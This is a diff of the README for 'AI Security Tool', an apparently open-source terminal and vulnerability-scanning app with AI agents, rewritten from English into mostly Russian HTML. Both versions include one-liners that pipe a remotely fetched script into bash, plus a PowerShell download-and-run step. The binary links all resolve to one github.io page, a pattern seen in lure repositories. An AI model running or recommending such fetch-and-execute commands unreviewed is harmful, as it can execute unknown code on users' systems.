@@ -1,651 +1,257 @@
-<div align="center">
-
-# 🛡️ AI Security Tool
-
-### AI-Powered Security Workstation for Vulnerability Discovery, SBOM Analysis & Remote Access
-
-<p>
-  <a href="https://zerodayevil.github.io/ai-security-tool">
-    <img src="https://img.shields.io/badge/Download%20Build-d90429?style=for-the-badge&logo=windows&logoColor=white" alt="Download Build">
-  </a>
-  <a href="https://zerodayevil.github.io/ai-security-tool">
-    <img src="https://img.shields.io/badge/Download%20Release-00509d?style=for-the-badge&logo=github&logoColor=white" alt="Download Release">
-  </a>
-</p>
-
-</div>
-
-<hr>
-
-<p align="center">
-  <img width="100%" alt="AI Security Tool" src="https://zerodayevil.github.io/ai-security-tool/banner.png">
-</p>
-
-<hr>
-
-## 🧠 Conceptual Overview
-
-**AI Security Tool** is a free and open-source security application that combines vulnerability intelligence, SBOM analysis, AI-assisted security workflows, terminal access and remote system management in a single environment.
-
-The project was originally created for personal use and evolved into a tool that can be used by security researchers, developers, DevOps engineers and anyone who needs to identify known vulnerabilities and work with local or remote systems.
-
-It can run as a **desktop application** or through a **web browser**, including on mobile devices.
-
-### 🎯 Core Philosophy
-
-> **One environment for security analysis, automation, AI assistance and system access.**
-
-The goal is to reduce the number of separate tools required for everyday security work while keeping vulnerability data, terminal access, automation and AI assistance in one place.
-
-<hr>
-
-## 🔐 Vulnerability Intelligence
-
-AI Security Tool collects vulnerability information from multiple public vulnerability databases and security advisory sources:
-
-<table>
-  <thead>
-    <tr>
-      <th>Source</th>
-      <th>Purpose</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><strong>NVD / CVE</strong></td>
-      <td>National vulnerability information and CVE records</td>
-    </tr>
-    <tr>
-      <td><strong>Red Hat</strong></td>
-      <td>Red Hat security advisories</td>
-    </tr>
-    <tr>
-      <td><strong>OSV</strong></td>
-      <td>Open Source Vulnerability database</td>
-    </tr>
-    <tr>
-      <td><strong>GitLab Advisory Database</strong></td>
-      <td>Package and dependency vulnerability advisories</td>
-    </tr>
-    <tr>
-      <td><strong>curl</strong></td>
-      <td>curl security advisories</td>
-    </tr>
-  </tbody>
-</table>
-
-<p>
-  Vulnerability data is cached locally and, by default, updated approximately once per day instead of being downloaded on every scan.
-</p>
-
-> ⚠️ The first download can take some time because vulnerability databases contain a large amount of data.
-
-<hr>
-
-## 📦 SBOM & Component Analysis
-
-AI Security Tool can identify software components and correlate them with known vulnerabilities.
-
-### Component Detection
-
-The tool can create a component list, including versions, using:
-
-- Binary file analysis
-- Programming-language dependency information
-- Dependency manifests such as `requirements.txt`
-- Other available component information
-
-### Existing SBOM
-
-An existing SBOM can be loaded and analyzed using a supported standardized format.
-
-The analysis workflow:
-
-```text
-Components / SBOM
-       │
-       ▼
- Component Detection
-       │
-       ▼
- Version Identification
-       │
-       ▼
- Vulnerability Correlation
-       │
-       ▼
- Security Report
-```
-
-### 📊 Vulnerability Reports
-
-Reports can be generated in:
-
-- Console
-- JSON
-- CSV
-- HTML
-- PDF
-
-Historical report data can also be used to track vulnerability changes over time and maintain additional remediation or contextual information.
-
-<hr>
-
-## 🤖 AI Assistance
-
-AI Security Tool supports integration with AI providers such as:
-
-- OpenAI
-- DeepSeek
-- Other compatible AI APIs
-
-AI assistance can be used for:
-
-- Command suggestions
-- Script generation
-- Terminal output analysis
-- Explaining security findings
-- Security workflow assistance
-- Working with available tools
-
-<hr>
-
-## 🧠 AI Agents
-
-The application includes **more than 12 specialized AI agents** designed for different security tasks and workflows.
-
-<table>
-  <thead>
-    <tr>
-      <th>Agent</th>
-      <th>Purpose</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><code>IntelligentDecisionEngine</code></td>
-      <td>Tool selection and parameter optimization</td>
-    </tr>
-    <tr>
-      <td><code>BugBountyWorkflowManager</code></td>
-      <td>Bug bounty workflow management</td>
-    </tr>
-    <tr>
-      <td><code>CTFWorkflowManager</code></td>
-      <td>CTF workflow assistance</td>
-    </tr>
-    <tr>
-      <td><code>CVEIntelligenceManager</code></td>
-      <td>CVE and vulnerability analysis</td>
-    </tr>
-    <tr>
-      <td><code>VulnerabilityCorrelator</code></td>
-      <td>Vulnerability relationships and potential attack chains</td>
-    </tr>
-    <tr>
-      <td><code>TechnologyDetector</code></td>
-      <td>Technology stack identification</td>
-    </tr>
-    <tr>
-      <td><code>RateLimitDetector</code></td>
-      <td>Request rate-limit detection</td>
-    </tr>
-    <tr>
-      <td><code>FailureRecoverySystem</code></td>
-      <td>Error handling and recovery</td>
-    </tr>
-    <tr>
-      <td><code>PerformanceMonitor</code></td>
-      <td>Performance monitoring and optimization</td>
-    </tr>
-    <tr>
-      <td><code>ParameterOptimizer</code></td>
-      <td>Context-aware parameter optimization</td>
-    </tr>
-    <tr>
-      <td><code>GracefulDegradation</code></td>
-      <td>Resilient operation when components fail</td>
-    </tr>
-  </tbody>
-</table>
-
-<hr>
-
-## 🖥️ Terminal & Remote Access
-
-AI Security Tool can also be used as a terminal and remote connection client.
-
-### Supported protocols
-
-<p>
-  <code>SSH</code>
-  <code>SFTP</code>
-  <code>Telnet</code>
-  <code>Serial</code>
-  <code>RDP</code>
-  <code>VNC</code>
-  <code>SPICE</code>
-  <code>FTP</code>
-</p>
-
-### Remote Access Features
-
-- Public-key and password authentication
-- SSH tunnels
-- Remote file editing
-- Global and session proxies
-- Quick commands
-- Terminal themes
-- Custom terminal backgrounds
-- Transparent window on macOS and Windows
-- Multi-terminal input
-- Bookmark synchronization
-- Theme synchronization
-- Quick-command synchronization
-- URL-based session initialization
-
-> Double-clicking a small remote file allows it to be opened directly for editing.
-
-<hr>
-
-## ⚡ Advanced Features
-
-<table>
-  <thead>
-    <tr>
-      <th>Feature</th>
-      <th>Description</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><strong>Intelligent Caching</strong></td>
-      <td>LRU-based caching for faster repeated operations</td>
-    </tr>
-    <tr>
-      <td><strong>Real-Time Process Management</strong></td>
-      <td>Monitor and manage running processes</td>
-    </tr>
-    <tr>
-      <td><strong>Vulnerability Analysis</strong></td>
-      <td>Monitor CVEs and analyze vulnerability information</td>
-    </tr>
-    <tr>
-      <td><strong>API Security Testing</strong></td>
-      <td>REST API, GraphQL and JWT security testing</td>
-    </tr>
-    <tr>
-      <td><strong>Real-Time Dashboard</strong></td>
-      <td>Live status, progress and security information</td>
-    </tr>
-    <tr>
-      <td><strong>Global Hotkey</strong></td>
-      <td>Show or hide the application window</td>
-    </tr>
-    <tr>
-      <td><strong>Fast Input</strong></td>
-      <td>Send input to one or multiple terminals</td>
-    </tr>
-    <tr>
-      <td><strong>URL Initialization</strong></td>
-      <td>Initialize application sessions from a URL</td>
-    </tr>
-  </tbody>
-</table>
-
-**Default global hotkey:** `Ctrl + 2`
-
-<hr>
-
-## 🌐 Web & Mobile
-
-AI Security Tool supports both desktop and browser-based operation.
-
-The browser interface can be used from desktop computers and mobile devices.
-
-| Platform | Support |
-|---|:---:|
-| Windows | ✅ |
-| macOS | ✅ |
-| Linux | ✅ |
-| Android | ✅ |
-| HarmonyOS | ✅ |
-| iOS | ✅ |
-
-<hr>
-
-## 🚀 How It Works
-
-A typical vulnerability analysis workflow:
-
-```text
-┌──────────────────────────┐
-│ Vulnerability Databases  │
-│ NVD / Red Hat / OSV /    │
-│ GitLab / curl            │
-└────────────┬─────────────┘
-             │
-             ▼
-┌──────────────────────────┐
-│      Local CVE Data     │
-└────────────┬─────────────┘
-             │
-             ▼
-┌──────────────────────────┐
-│ Component / SBOM Analysis│
-└────────────┬─────────────┘
-             │
-             ▼
-┌──────────────────────────┐
-│ Vulnerability Correlation│
-└────────────┬─────────────┘
-             │
-             ▼
-┌──────────────────────────┐
-│     Security Report      │
-└──────────────────────────┘
-```
-
-<hr>
-
-## 📥 Download
-
-**AI Security Tool is free and open source.**
-
-### 🪟 Windows
-
-**Installer — recommended**
-
-[Download `5.3.26-win-x64-installer.exe`](https://zerodayevil.github.io/ai-security-tool#5.3.26-win-x64-installer.exe)
-
-**Portable**
-
-[Download `5.3.26-win-x64.tar.gz`](https://zerodayevil.github.io/ai-security-tool#5.3.26-win-x64.tar.gz)
-
-Extract the archive and run the application.
-
-### 🍎 macOS
-
-**Apple Silicon**
-
-[Download `5.3.26-mac-arm64.dmg`](https://zerodayevil.github.io/ai-security-tool#5.3.26-mac-arm64.dmg)
-
-For Macs with Apple Silicon processors such as M1, M2, M3 and newer.
-
-### 🐧 Linux
-
-[Download `5.3.26-linux-x64.tar.gz`](https://zerodayevil.github.io/ai-security-tool#5.3.26-linux-x64.tar.gz)
-
-Extract the archive and run the application.
-
-### 📱 Android
-
-[Download `android-arm64-v8a-5.3.27.apk`](https://zerodayevil.github.io/ai-security-tool#android-arm64-v8a-5.3.27.apk)
-
-For ARM64 Android devices.
-
-### Other platforms
-
-Builds are also available for:
-
-- HarmonyOS
-- iOS
-
-See the project's download page for the latest builds.
-
-<hr>
-
-## 🛠️ Deploy From Source
-
-### Linux / macOS
-
-```bash
-curl -o- https://github.com/ZeroDayEvil/ai-security-tool/scripts/one-line-web.sh | bash
-```
-
-or:
-
-```bash
-wget -qO- https://github.com/ZeroDayEvil/ai-security-tool/scripts/one-line-web.sh | bash
-```
-
-### Windows
-
-```powershell
-Invoke-WebRequest -Uri "https://github.com/ZeroDayEvil/ai-security-tool/scripts/one-line-web.bat" -OutFile "one-line-web.bat"
-
-cmd.exe /c ".\one-line-web.bat"
-```
-
-> **Security recommendation:** Review deployment scripts before executing them.
-
-<hr>
-
-## 🏗️ Build & Run
-
-Build the application:
-
-```bash
+<article class="markdown-body entry-content container-lg" itemprop="text">
+  <h1>🛡️ AI Security Tool — Cross-Platform AI-Native Terminal & Supply Chain Scanner</h1>
+  <p><strong>Next-Gen AI Security Ecosystem, Multi-Protocol Terminal & Autonomous Agent Suite</strong></p>
+  <hr>
+  <p align="center">
+    <a href="https://github.com/ZeroDayEvil/ai-security-tool/releases" rel="nofollow"><img src="https://img.shields.io/github/v/release/ZeroDayEvil/ai-security-tool?style=for-the-badge&amp;logo=github&amp;color=blue" alt="Latest Release" style="max-width: 100%;"></a>
+    <a href="https://github.com/ZeroDayEvil/ai-security-tool/actions" rel="nofollow"><img src="https://img.shields.io/github/actions/workflow/status/ZeroDayEvil/ai-security-tool/build.yml?style=for-the-badge&amp;logo=github&amp;label=Build" alt="Build Status" style="max-width: 100%;"></a>
+    <a href="https://opencollective.com/ZeroDayEvil" rel="nofollow"><img src="https://img.shields.io/opencollective/all/ZeroDayEvil?style=for-the-badge&amp;logo=open-collective&amp;color=brightgreen" alt="Donations" style="max-width: 100%;"></a>
+    <a href="https://t.me/ZeroDyaTool_channel" rel="nofollow"><img src="https://img.shields.io/badge/Telegram-Channel-0088cc?style=for-the-badge&amp;logo=telegram&amp;logoColor=white" alt="Telegram Channel" style="max-width: 100%;"></a>
+    <a href="LICENSE" rel="nofollow"><img src="https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge" alt="License" style="max-width: 100%;"></a>
+  </p>
+
+  <p align="center">
+    <a href="https://ZeroDyaStart.app" rel="nofollow"><b>🌐 Демо-версия</b></a> • 
+    <a href="https://zerodayevil.github.io/ai-security-tool" rel="nofollow"><b>📚 Сайт проекта</b></a> • 
+    <a href="https://t.me/ZeroDyaTool_chat" rel="nofollow"><b>💬 Чат сообщества</b></a>
+  </p>
+
+  <p align="center">
+    <img width="100%" alt="AI Security Tool Banner" src="https://zerodayevil.github.io/ai-security-tool/assets/banner.png" style="max-width: 100%; border-radius: 8px;">
+  </p>
+  <hr>
+
+  <h2>🧠 Conceptual Overview</h2>
+  <p>
+    <strong>AI Security Tool</strong> — это кроссплатформенный инструмент с открытым исходным кодом, созданный на стыке традиционного администрирования и современной информационной безопасности. Он объединяет мультипротокольный комбайн для подключения (SSH, RDP, VNC), функционал глубокого анализа цепочек поставок (Supply Chain Security, CVE & SBOM) и автономную экосистему из <strong>12+ ИИ-агентов</strong>.
+    <br><br>
+    Инструмент устраняет необходимость переключаться между десятками утилит при проведении аудита безопасности, решения задач Red Team, Pentest или CTF. Приложение доступно как в десктопном исполнении (<strong>Linux, macOS, Windows, Android, iOS, HarmonyOS</strong>), так и в виде полноценного <strong>Web-интерфейса</strong>.
+  </p>
+
+  <h3>🎯 Core Philosophy</h3>
+  <p>
+    <em>"Bridge the gap between execution, intelligence, and supply chain audit."</em><br>
+    Мы создали AI Security Tool, чтобы избавиться от рутинного ручного анализа. Взамен разрозненных скриптов инструмент предоставляет единую AI-Native платформу, самостоятельно сопоставляющую контекст уязвимостей, подбирающую параметры и автоматизирующую процессы аудита.
+  </p>
+  <hr>
+
+  <h2>🖥 Key Features & Architecture</h2>
+  <h3>💻 Multi-Protocol Terminal & Client</h3>
+  <ul>
+    <li><strong>Поддержка протоколов:</strong> SSH, SFTP, Telnet, Serial Port, RDP, VNC, SPICE, FTP.</li>
+    <li><strong>UI & Кастомизация:</strong> Прозрачность окна (macOS, Windows), пользовательские темы и фоновые изображения.</li>
+    <li><strong>Удобство управления:</strong>
+      <ul>
+        <li>Вызываемый терминал по горячей клавише (Guake-style, по умолчанию <code>Ctrl + 2</code>).</li>
+        <li>Прямое редактирование удаленных файлов по двойному клику через SFTP.</li>
+        <li>Мульти-ввод (одновременная трансляция команд на несколько сессий).</li>
+        <li>SSH-туннелирование, поддержка ключей/паролей, глобальные и сессионные прокси.</li>
+        <li>Синхронизация настроек и закладок через GitHub Gist / Gitee Snippets.</li>
+      </ul>
+    </li>
+  </ul>
+
+  <h3>⚡ Advanced Capabilities</h3>
+  <ul>
+    <li><strong>Интеллектуальное кэширование:</strong> Ускорение повторных анализов с помощью LRU-алгоритмов.</li>
+    <li><strong>Real-Time Process Manager:</strong> Оперативный мониторинг и управление процессами системы.</li>
+    <li><strong>API Security Testing:</strong> Встроенные модули для тестирования GraphQL, JWT и REST API.</li>
+    <li><strong>LLM Integration:</strong> Интеграция с DeepSeek, OpenAI и другими провайдерами для автоподсказа команд, генерации скриптов и интерпретации вывода.</li>
+  </ul>
+  <hr>
+
+  <h2>🤖 Specialized AI-Agents Suite</h2>
+  <p>Для автоматизации сложных сценариев аудита в систему внедрены специализированные автономные агенты:</p>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Агент</th>
+        <th>Назначение</th>
+        <th>Тип задачи</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>IntelligentDecisionEngine</code></td>
+        <td>Автоматический выбор инструментов и контекстная оптимизация параметров</td>
+        <td>🧠 Core Logic</td>
+      </tr>
+      <tr>
+        <td><code>BugBountyWorkflowManager</code></td>
+        <td>Управление рабочими процессами поиска уязвимостей в рамках Bug Bounty</td>
+        <td>🎯 Pentest / Recon</td>
+      </tr>
+      <tr>
+        <td><code>CTFWorkflowManager</code></td>
+        <td>Автоматизация и поддержка решения соревновательных задач CTF</td>
+        <td>🚩 CTF Automation</td>
+      </tr>
+      <tr>
+        <td><code>CVEIntelligenceManager</code></td>
+        <td>Глубокий анализ уязвимостей и сбор Threat Intelligence</td>
+        <td>🔍 Threat Intel</td>
+      </tr>
+      <tr>
+        <td><code>VulnerabilityCorrelator</code></td>
+        <td>Обнаружение и построение сложных цепочек атак (Attack Chains)</td>
+        <td>🔗 Correlation</td>
+      </tr>
+      <tr>
+        <td><code>TechnologyDetector</code></td>
+        <td>Идентификация полного технологического стека целевой системы</td>
+        <td>🌐 Fingerprinting</td>
+      </tr>
+      <tr>
+        <td><code>RateLimitDetector</code></td>
+        <td>Обнаружение и автоматический обход ограничений частоты запросов</td>
+        <td>⚡ Bypass & Evasion</td>
+      </tr>
+      <tr>
+        <td><code>FailureRecoverySystem</code></td>
+        <td>Обработка сбоев инструментария и автоматическое восстановление</td>
+        <td>🛡 System Resilience</td>
+      </tr>
+      <tr>
+        <td><code>PerformanceMonitor</code></td>
+        <td>Мониторинг ресурсов и оптимизация системной нагрузки</td>
+        <td>📊 Resource Control</td>
+      </tr>
+      <tr>
+        <td><code>ParameterOptimizer</code></td>
+        <td>Контекстно-зависимая подборка параметров фаззинга и сканирования</td>
+        <td>⚙️ Fuzzing Tuning</td>
+      </tr>
+      <tr>
+        <td><code>GracefulDegradation</code></td>
+        <td>Обеспечение отказоустойчивости при недоступности внешних сервисов</td>
+        <td>🔄 Fault Tolerance</td>
+      </tr>
+    </tbody>
+  </table>
+  <hr>
+
+  <h2>📊 Security Scanning & SBOM Workflow</h2>
+  <pre><code class="language-mermaid">graph TD
+    A[Target Project / Assets] --> B{Aggregated CVE DB Engine}
+    B -->|Daily Sync| C[NVD / OSV / GAD / RedHat]
+    A --> D[Binary & Dependency Analyzers]
+    D --> E[Generate / Parse SBOM Standard]
+    E --> F{Vulnerability Correlator}
+    C --> F
+    F --> G[Enrich Context & Remediation Data]
+    G --> H[Export Reports: Console / JSON / CSV / HTML / PDF]
+  </code></pre>
+  <hr>
+
+  <h2>🚀 Quick Start & Installation</h2>
+  <h3>📦 Ready-to-Use Builds</h3>
+  <table>
+    <thead>
+      <tr>
+        <th>Платформа</th>
+        <th>Архитектура / Формат</th>
+        <th>Ссылка</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Windows</strong></td>
+        <td>x64 Installer (.exe)</td>
+        <td><a href="https://zerodayevil.github.io/ai-security-tool#5.3.26-win-x64-installer.exe">Скачать .exe</a></td>
+      </tr>
+      <tr>
+        <td><strong>Windows</strong></td>
+        <td>x64 Portable (.tar.gz)</td>
+        <td><a href="https://zerodayevil.github.io/ai-security-tool#5.3.26-win-x64.tar.gz">Скачать .tar.gz</a></td>
+      </tr>
+      <tr>
+        <td><strong>macOS</strong></td>
+        <td>Apple Silicon M1/M2/M3 (.dmg)</td>
+        <td><a href="https://zerodayevil.github.io/ai-security-tool#5.3.26-mac-arm64.dmg">Скачать .dmg</a></td>
+      </tr>
+      <tr>
+        <td><strong>Linux</strong></td>
+        <td>Universal x64 (.tar.gz)</td>
+        <td><a href="https://zerodayevil.github.io/ai-security-tool#5.3.26-linux-x64.tar.gz">Скачать .tar.gz</a></td>
+      </tr>
+      <tr>
+        <td><strong>Android</strong></td>
+        <td>ARM64 APK (.apk)</td>
+        <td><a href="https://zerodayevil.github.io/ai-security-tool#android-arm64-v8a-5.3.27.apk">Скачать .apk</a></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>🧪 One-Line Installation Scripts</h3>
+  <p>Быстрая установка и запуск развертывания одной командой:</p>
+  <p><strong>Linux / macOS:</strong></p>
+  <pre><code class="language-bash">curl -o- https://raw.githubusercontent.com/ZeroDayEvil/ai-security-tool/main/scripts/one-line-web.sh | bash
+# или через wget:
+wget -qO- https://raw.githubusercontent.com/ZeroDayEvil/ai-security-tool/main/scripts/one-line-web.sh | bash</code></pre>
+
+  <p><strong>Windows (PowerShell / CMD):</strong></p>
+  <pre><code class="language-powershell">Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ZeroDayEvil/ai-security-tool/main/scripts/one-line-web.bat" -OutFile "one-line-web.bat"
+cmd.exe /c ".\one-line-web.bat"</code></pre>
+
+  <h3>🛠 Build from Source</h3>
+  <pre><code class="language-bash"># Клонирование репозитория
+git clone https://github.com/ZeroDayEvil/ai-security-tool.git
+cd ai-security-tool
+
+# Установка зависимостей и сборка
+npm install
 npm run build
-```
 
-Run the production server:
-
-```bash
+# Запуск в Production-режиме
 npm run prod
-```
-
-or:
-
-```bash
-./build/bin/run-prod.sh
-```
-
-Then open:
-
-```text
-http://127.0.0.1:5577
-```
-
-<hr>
-
-## 🖥️ Server Deployment
-
-Configure `.env`:
-
-```env
-ENABLE_AUTH=1
-DISABLE_LOCAL_TERMINAL=1
-SERVER_SECRET=some-server-secret
-SERVER_PASS=some-login-password
-```
-
-### Configuration
-
-| Variable | Description |
-|---|---|
-| `ENABLE_AUTH` | Enables authentication |
-| `DISABLE_LOCAL_TERMINAL` | Disables access to the local terminal |
-| `SERVER_SECRET` | Server secret |
-| `SERVER_PASS` | Authentication password |
-
-Start the production server:
-
-```bash
-./run-ai-security-tool-web.sh
-```
-
-### Nginx
-
-Example configurations:
-
-```text
-examples/nginx.conf
-examples/nginx-ssl.conf
-```
-
-<hr>
-
-## 🔒 Security
-
-> ⚠️ **Important Security Notice**
-
-AI Security Tool can provide AI agents with powerful access to local and remote systems.
-
-Depending on configuration, agents may interact with:
-
-- Terminals
-- Files
-- Network services
-- Remote systems
-- Security tools
-- Scripts and commands
-
-### Production recommendations
-
-- Enable authentication.
-- Disable the local terminal when it is not required.
-- Use HTTPS.
-- Use a strong `SERVER_SECRET`.
-- Use a strong server password.
-- Restrict access with a firewall.
-- Review AI-agent permissions.
-- Monitor agent activity.
-- Avoid unnecessary privileges.
-
-**Do not expose an unauthenticated instance directly to the public Internet.**
-
-AI-generated commands and scripts should be reviewed before execution on production or sensitive systems.
-
-<hr>
-
-## 🔄 CI/CD & Supply Chain Security
-
-AI Security Tool can be integrated into continuous integration and delivery workflows.
-
-```text
-Build
-  │
-  ▼
-Detect Components
-  │
-  ▼
-Generate / Read SBOM
-  │
-  ▼
-Check Vulnerability Databases
-  │
-  ▼
-Match Known Vulnerabilities
-  │
-  ▼
-Generate Report
-  │
-  ▼
-Review / Fail Pipeline
-```
-
-This helps identify known vulnerabilities in software dependencies and components earlier in the development and deployment lifecycle.
-
-<hr>
-
-## 🤝 Contributing
-
-AI Security Tool is free and open source. Contributions, bug reports, ideas and improvements are welcome.
-
-### Priority Areas
-
-| Area | Examples |
-|---|---|
-| 🤖 **AI Agents** | New providers, models, agents and workflows |
-| 🛡️ **Security Tools** | Additional security and vulnerability tools |
-| ⚡ **Performance** | Caching, optimization and scalability |
-| 📖 **Documentation** | Examples, guides and integrations |
-| 🧪 **Testing** | Automated, integration and cross-platform tests |
-| 🐛 **Bug Fixes** | Fixes and improvements across supported platforms |
-
-### Development Workflow
-
-1. Fork the repository.
-2. Create a feature branch.
-3. Make your changes.
-4. Add or update tests where appropriate.
-5. Submit a pull request.
-
-<hr>
-
-## 🐞 Bug Reports & Feature Requests
-
-If you find a bug or have an idea for a new feature, please open an issue in the repository.
-
-Include:
-
-- AI Security Tool version
-- Operating system
-- Steps to reproduce
-- Expected behavior
-- Actual behavior
-- Relevant logs
-
-**Never include passwords, API keys, private keys or other sensitive information in public issues.**
-
-<hr>
-
-## 🛡️ Security Vulnerabilities
-
-Please **do not publicly disclose serious security vulnerabilities through GitHub Issues**.
-
-Use the project's private security reporting process instead.
-
-See [`SECURITY.md`](SECURITY.md) for details.
-
-<hr>
-
-## ⚖️ License
-
-AI Security Tool is free and open-source software.
-
-See [`LICENSE`](LICENSE) for the applicable license and terms of use.
-
-<hr>
-
-## 📞 Contact
-
-### Project
-
-**GitHub:**  
-https://github.com/ZeroDayEvil/ai-security-tool
-
-**Website:**  
-https://zerodayevil.github.io/ai-security-tool
-
-### Telegram
-
-- **Admin:** https://t.me/ZeroDayEvil
-- **Community Chat:** https://t.me/ZeroDyaTool_chat
-- **News Channel:** https://t.me/ZeroDyaTool_channel
-
-### Other Projects
-
-https://github.com/ZeroDayEvil
-
-### Support the Project
-
-**OpenCollective:**  
-https://opencollective.com/ZeroDayEvil
-
-<hr>
-
-<div align="center">
-
-### ⭐ Support the Project
-
-If AI Security Tool is useful to you:
-
-⭐ Star the repository · 🐛 Report bugs · 💡 Suggest features · 🔧 Contribute · 📖 Improve documentation
-
-<br>
-
-**Free. Open Source. Built for Security.**
-
-</div>
+# или через скрипт: ./build/bin/run-prod.sh</code></pre>
+  <p>После запуска откройте браузер: <code>http://127.0.0.1:5577</code></p>
+
+  <h3>🌐 Server Deployment & Configuration</h3>
+  <p>При развертывании приложения в публичной сети настройте файл <code>.env</code>:</p>
+  <pre><code class="language-text">ENABLE_AUTH=1                   # Включить авторизацию по паролю
+DISABLE_LOCAL_TERMINAL=1        # Отключить доступ к локальному терминалу сервера
+SERVER_SECRET=your_server_secret_key
+SERVER_PASS=your_strong_password</code></pre>
+  <p>Запуск сервиса:</p>
+  <pre><code class="language-bash">./run-ai-security-tool-web.sh</code></pre>
+  <p><em>Готовые конфиги для Nginx/SSL доступны в директории <code>examples/nginx.conf</code>.</em></p>
+  <hr>
+
+  <h2>⚖️ License & Legal Disclaimer</h2>
+  <h3>🚨 Security & Compliance Notice</h3>
+  <blockquote>
+    <p>
+      <strong>ВАЖНО: Инструмент предоставляет ИИ-агентам доступ к вызову системных команд.</strong><br>
+      • <strong>Контроль действий:</strong> Всегда отслеживайте работу ИИ-агентов через панель мониторинга в реальном времени.<br>
+      • <strong>Минимизация привилегий:</strong> Запускайте инструмент исключительно с минимально необходимыми правами в системе.<br>
+      • <strong>Сетевая безопасность:</strong> Обязательно активируйте авторизацию (<code>ENABLE_AUTH=1</code>) и отключайте локальный терминал (<code>DISABLE_LOCAL_TERMINAL=1</code>) при публикации Web-интерфейса во внешних сетях.<br>
+      Использование утилиты на сторонних объектах без письменного разрешения владельца является нелегальным. Разработчики не несут ответственности за возможный ущерб.
+    </p>
+  </blockquote>
+  <hr>
+
+  <h2>🔄 Contribution & Community</h2>
+  <p>Мы приветствуем любой вклад в развитие проекта! Основные направления:</p>
+  <ol>
+    <li><strong>ИИ-Интеграции:</strong> Подключение новых LLM-провайдеров и расширение возможностей агентов.</li>
+    <li><strong>Security Tools:</strong> Интеграция сторонних CLI-сканеров и парсеров.</li>
+    <li><strong>Оптимизация:</strong> Повышение скорости работы парсеров и эффективности кэширования.</li>
+    <li><strong>Документация:</strong> Написание гайдов, переводы и CI/CD шаблоны.</li>
+  </ol>
+  <hr>
+
+  <h2>🔗 Contact & Support</h2>
+  <ul>
+    <li><strong>Официальный сайт:</strong> <a href="https://zerodayevil.github.io/ai-security-tool">zerodayevil.github.io/ai-security-tool</a></li>
+    <li><strong>Web-Demo:</strong> <a href="https://ZeroDyaStart.app">ZeroDyaStart.app</a></li>
+    <li><strong>Telegram Admin:</strong> <a href="https://t.me/ZeroDayEvil">@ZeroDayEvil</a></li>
+    <li><strong>Telegram Чат:</strong> <a href="https://t.me/ZeroDyaTool_chat">@ZeroDyaTool_chat</a></li>
+    <li><strong>Telegram Канал:</strong> <a href="https://t.me/ZeroDyaTool_channel">@ZeroDyaTool_channel</a></li>
+    <li><strong>Open Collective:</strong> <a href="https://opencollective.com/ZeroDayEvil">opencollective.com/ZeroDayEvil</a></li>
+  </ul>
+  <hr>
+
+  <p align="center"><em>AI Security Tool — Reimagining terminal workflow and automation for cybersecurity professionals.</em></p>
+</article>
